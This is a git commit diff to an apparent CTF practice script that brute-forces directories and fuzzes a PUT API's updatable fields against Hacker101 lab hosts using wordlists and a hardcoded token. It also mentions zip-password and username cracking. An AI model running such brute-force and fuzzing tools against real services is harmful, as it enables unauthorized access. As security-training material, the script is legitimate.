13f9b96bd2cd14f30c1ebb5c9d04faa6b81e0537
sterf-mac <stefhwin@gmail.com>
2024-03-12 17:08:18 -0400

    checking update fields in put request

--- un-pw-directory-bruteforce.py
+++ un-pw-directory-bruteforce.py
@@ -70,9 +70,6 @@ def zip_cracking():
     print("Finished password list")
 
 
-URL = "https://5ede825f3a5ea95033d1467ca348ac9c.ctf.hacker101.com/swag-shop/api/"
-un_fail_string = "Invalid Username"
-pw_fail_string = "Invalid Password"
 filename = "my_secure_files_not_for_you.zip"
 # zip_cracking()
 # force_usernames()
@@ -86,14 +83,43 @@ def directory_finding():
         if dir.status_code != 404:
             print(dir.status_code, "/" + route)
 
+    for i in range(100):
+        if i % 10 == 0:
+            print("trying", i)
+        try_path(f"v{i}")
+
     # with ThreadPoolExecutor(10) as tpe:
-    for idx, route in enumerate(open(path + dir4K).readlines()):
-        if idx % 100 == 0:
-            print("Trying directory #", idx)
-            # tpe.submit(try_path, route.strip())
-        try_path(route.strip())
+    # for idx, route in enumerate(open(path + dir4K).readlines()):
+    #     if idx % 100 == 0:
+    #         print("Trying directory #", idx)
+    #         # tpe.submit(try_path, route.strip())
+    #     try_path(route.strip())
 
 
 # for swag-shop - there is api/sessions, api/stock, and api/user (400)
 
-directory_finding()
+# directory_finding()
+
+URL = "https://9461a2a1ad7b539e431d7ee288bdf1ab.ctf.hacker101.com/api/v1/user"
+ep_fail = '{"error":"No updatable fields supplied"}'
+
+
+def user_update():
+    def try_field(field, i):
+        response = requests.put(
+            URL,
+            headers={"x-token": "04d88d27dbd55281f0d8808336b67960"},
+            params={field: "01234"},
+        )
+        if response.status_code != 400:
+            print(response.status_code, "/" + field)
+        if i == 0:
+            print(response.text)
+
+    for idx, field in enumerate(open(path + "userfield6000.txt").readlines()):
+        if idx % 100 == 0:
+            print("trying", idx)
+        try_field(field, idx)
+
+
+user_update()
